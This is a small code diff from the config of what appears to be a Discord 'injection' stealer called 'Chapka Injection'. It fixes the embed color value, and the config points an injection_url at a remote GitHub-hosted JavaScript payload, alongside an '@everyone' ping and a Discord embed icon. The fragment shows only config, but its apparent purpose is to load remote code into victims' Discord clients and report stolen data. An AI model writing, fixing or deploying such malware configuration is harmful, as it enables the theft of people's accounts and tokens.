@@ -19,7 +19,7 @@ const config = {
   ping_val: '@everyone',
   embed_name: 'Chapka Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1192866107757965362/1199051223039488000/full.png'.replace(/ /g, '%20'), 
-  embed_color: ff4238, 
+  embed_color: 16727870, 
   injection_url: 'https://raw.githubusercontent.com/nxbi284/crinjrealject/main/crinjrealject.js', 
   /**
    
